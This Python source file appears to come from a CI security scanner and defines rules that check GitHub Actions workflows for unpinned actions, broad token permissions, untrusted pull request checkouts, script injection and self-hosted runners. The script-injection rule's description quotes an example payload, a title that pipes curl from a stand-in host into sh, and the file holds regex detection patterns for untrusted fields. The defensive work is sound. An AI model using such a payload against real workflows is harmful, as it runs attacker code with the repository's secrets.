"""GitHub Actions specific rules (G3): action pinning, token permissions, untrusted-code workflows, script injection, self-hosted runners.

They only apply to ``platform == "gha"`` pipelines. Steps that came from a reusable workflow (id ``callee:``) are judged in the callee's own file.
"""

from __future__ import annotations

import re

from pch.engine.registry import rule, rule_params
from pch.model.findings import RuleResult
from pch.model.pipeline import Pipeline, Step
from pch.model.repo import RepoContext
from pch.normalize.gha import PUBLIC_EVENTS, effective_permissions, owner_of, write_scopes
from pch.settings import Policy

GHA = {"gha"}
EXPR = re.compile(r"\$\{\{(.*?)\}\}", re.S)
# Fields an outsider controls (issue / PR / comment text, branch names, commit messages): GitHub's own script-injection guidance.
DEFAULT_UNTRUSTED = [
    r"github\.event\.(issue|pull_request|discussion)\.(title|body)",
    r"github\.event\.(comment|review|review_comment)\.body",
    r"github\.event\.pull_request\.head\.(ref|label|repo\.default_branch)",
    r"github\.event\.(head_commit|commits\.[^.}\s]+)\.(message|author\.(name|email))",
    r"github\.event\.pages\.[^.}\s]+\.page_name",
    r"github\.event\.workflow_run\.(head_branch|head_commit\.(message|author\.(name|email))|head_repository\.description|pull_requests\.[^.}\s]+\.head\.ref)",
    r"github\.head_ref",
]
UNTRUSTED_REF = re.compile(r"github\.(head_ref|event\.pull_request\.head\.|event\.workflow_run\.head_|event\.pull_request\.number)|refs/pull/", re.I)
SCRIPT_CHECKOUT = re.compile(r"\bgh\s+pr\s+checkout\b|\bgit\s+(checkout|fetch|pull|merge)\b[^\n]*(github\.(head_ref|event\.pull_request\.head)|refs/pull/)", re.I)


def _own_steps(p: Pipeline) -> list[Step]:
    return [s for s in p.all_steps() if s.enabled and not s.id.startswith("callee:")]


@rule(
    "SUP-006", "Actions are pinned to a full commit SHA", "medium", "pipeline",
    "A tag or branch can be moved by whoever controls the action's repository (or someone who compromises it); a full commit SHA cannot. "
    "Local actions (./path) are exempt; owners listed in `trusted_owners` may use version tags (never branches).",
    {"gha": "Replace `uses: owner/action@v4` with `uses: owner/action@<40-character commit SHA> # v4.x.y` (Dependabot or Renovate can keep the SHAs current)."},
    platforms=GHA, requires_sources={"gha"}, params={"trusted_owners": []},
)
def sup_006(ctx: RepoContext, policy: Policy, p: Pipeline) -> RuleResult:
    trusted = {o.lower().removesuffix("/*") for o in rule_params(policy, "SUP-006")["trusted_owners"]}
    uses = [s for s in _own_steps(p) if s.ref_kind is not None and s.ref_kind != "local"]
    if not uses:
        return RuleResult.na("no external actions")
    bad = []
    for s in uses:
        if s.ref_kind == "sha":
            continue
        if s.ref_kind == "tag" and owner_of(s.task or "") in trusted:
            continue
        bad.append(f"{(s.task or '').split('@')[0]}@{(s.task or '').rsplit('@', 1)[-1]} ({s.ref_kind})")
    bad = sorted(set(bad))
    if bad:
        return RuleResult.failed(f"{len(bad)} action reference(s) not pinned to a commit SHA: " + ", ".join(bad[:8]) + (" ..." if len(bad) > 8 else ""), actions=bad)
    return RuleResult.passed(f"{len(uses)} action reference(s) pinned to a commit SHA or from a trusted owner")


@rule(
    "SEC-006", "Workflow token permissions follow least privilege", "high", "pipeline",
    "GITHUB_TOKEN permissions default to the repository setting (often read-write). A declared top-level `permissions:` block with read-only defaults "
    "and write scopes only on the jobs that need them limits what a compromised step or action can do.",
    {"gha": "Add a top-level `permissions: contents: read` and grant write scopes (id-token, packages, ...) only on the job that needs them; never use write-all."},
    platforms=GHA, requires_sources={"gha"}, params={"job_write_scopes": ["id-token", "packages", "security-events", "deployments", "attestations", "pull-requests", "checks", "statuses", "pages"]},
)
def sec_006(ctx: RepoContext, policy: Policy, p: Pipeline) -> RuleResult:
    allowed = set(rule_params(policy, "SEC-006")["job_write_scopes"])
    top = p.meta.get("permissions")
    jobs = [(st.name, j.permissions) for st in p.stages for j in st.jobs if not j.uses_workflow or j.permissions is not None]
    if top == "write-all" or any(jp == "write-all" for _, jp in jobs):
        return RuleResult.failed("`permissions: write-all` grants every scope to the token")
    top_write = write_scopes(top)
    if top_write:
        return RuleResult.failed("write access declared for the whole workflow: " + ", ".join(top_write) + " (declare it on the job that needs it)", scopes=top_write)
    if top is None:
        missing = [name for name, jp in jobs if jp is None]
        if missing:
            return RuleResult.failed("no top-level `permissions:` and job(s) without their own: " + ", ".join(missing[:6]) + " (the token gets the repository default, possibly read-write)", jobs=missing)
    odd = sorted({f"{name}: {s}" for name, jp in jobs for s in write_scopes(jp) if s not in allowed})
    if odd:
        return RuleResult.warn("job-level write scopes to review: " + ", ".join(odd), scopes=odd)
    eff = [effective_permissions(jp, top) for _, jp in jobs]
    return RuleResult.passed("permissions are declared, read-only by default, with write scopes limited to jobs", jobs=len(eff))


@rule(
    "SEC-007", "pull_request_target / workflow_run workflows do not run untrusted code", "critical", "pipeline",
    "These triggers run with a write token and the repository's secrets. Checking out the pull request head (or a fork's workflow run) and building or running "
    "it hands an outsider those secrets.",
    {"gha": "Do not check out `github.event.pull_request.head.*` / `workflow_run.head_*` in these workflows; split the untrusted build into a plain `pull_request` workflow "
            "and pass only data (reviewed, not executed) to the privileged one."},
    platforms=GHA, requires_sources={"gha"},
)
def sec_007(ctx: RepoContext, policy: Policy, p: Pipeline) -> RuleResult:
    events = set(p.meta.get("events") or [])
    if not events & {"pull_request_target", "workflow_run"}:
        return RuleResult.na("workflow is not triggered by pull_request_target or workflow_run")
    bad: list[str] = []
    warn: list[str] = []
    for s in _own_steps(p):
        low = {str(k).lower(): v for k, v in s.inputs.items()}
        if (s.task or "").lower().startswith("actions/checkout@") and any(UNTRUSTED_REF.search(str(low.get(k) or "")) for k in ("ref", "repository")):
            bad.append(f"{s.name}: checkout of the pull request / triggering run head")
        elif s.inline_script and SCRIPT_CHECKOUT.search(s.inline_script):
            bad.append(f"{s.name}: script fetches the pull request head")
        elif "workflow_run" in events and (s.task or "").lower().startswith("actions/download-artifact@") and (low.get("run-id") or low.get("github-token")):
            warn.append(f"{s.name}: downloads artifacts of the triggering run (untrusted content)")
    if bad:
        return RuleResult.failed("untrusted code is checked out with secrets and a write token: " + "; ".join(bad), steps=bad)
    if warn:
        return RuleResult.warn("; ".join(warn) + " - treat them as data, never execute", steps=warn)
    return RuleResult.passed("no checkout or fetch of untrusted pull request code")


def _injectable(script: str, patterns: list[re.Pattern[str]]) -> list[str]:
    hits: list[str] = []
    for m in EXPR.finditer(script):
        body = m.group(1).strip()
        if any(rx.search(body) for rx in patterns):
            hits.append(body[:80])
    return hits


@rule(
    "SEC-008", "No script injection through untrusted event data", "high", "pipeline",
    "`${{ github.event.pull_request.title }}` inside `run:` is substituted into the shell script before it runs: a title like `\"; curl evil | sh #` executes. "
    "Pass untrusted values through an environment variable instead.",
    {"gha": "Move the expression to `env:` (e.g. `env: TITLE: ${{ github.event.pull_request.title }}`) and use `\"$TITLE\"` in the script."},
    platforms=GHA, requires_sources={"gha"}, params={"untrusted_contexts": DEFAULT_UNTRUSTED},
)
def sec_008(ctx: RepoContext, policy: Policy, p: Pipeline) -> RuleResult:
    pats: list[re.Pattern[str]] = []
    for x in rule_params(policy, "SEC-008")["untrusted_contexts"]:
        try:
            pats.append(re.compile(x))
        except re.error:
            continue
    scripts = [(s, s.inline_script or "") for s in _own_steps(p) if s.inline_script]
    scripts += [(s, str(s.inputs.get("script") or "")) for s in _own_steps(p) if (s.task or "").lower().startswith("actions/github-script@") and s.inputs.get("script")]
    if not scripts:
        return RuleResult.na("no run or github-script steps")
    bad = [{"step": s.name, "expressions": hits} for s, text in scripts if (hits := _injectable(text, pats))]
    if bad:
        return RuleResult.failed("untrusted data interpolated into scripts: " + "; ".join(f"{b['step']} ({', '.join(b['expressions'][:2])})" for b in bad[:5]), steps=bad)
    return RuleResult.passed("no untrusted event data is interpolated into scripts")


@rule(
    "SEC-009", "Self-hosted runners are not used by workflows that outsiders can trigger", "medium", "pipeline",
    "A pull request, issue or comment event can start a workflow; on a self-hosted runner that code runs inside your network and may persist between jobs. "
    "Always a warning (the repository may be private and fork pull requests disabled).",
    {"gha": "Use GitHub-hosted (or ephemeral, isolated) runners for workflows triggered by pull_request, issue_comment and similar events, or require approval for outside collaborators."},
    platforms=GHA, requires_sources={"gha"},
)
def sec_009(ctx: RepoContext, policy: Policy, p: Pipeline) -> RuleResult:
    hosted = [j.name for st in p.stages for j in st.jobs if j.self_hosted]
    if not hosted:
        return RuleResult.na("no self-hosted runner")
    events = sorted(set(p.meta.get("events") or []) & PUBLIC_EVENTS)
    if not events:
        return RuleResult.passed("self-hosted runners are only used by workflows with trusted triggers", jobs=hosted)
    vis = ctx.facts.github.visibility if ctx.facts.github else ""
    return RuleResult.warn(f"self-hosted runner job(s) {', '.join(hosted)} run on {', '.join(events)} events" + (" in a public repository" if vis == "public" else ""), jobs=hosted, events=events)

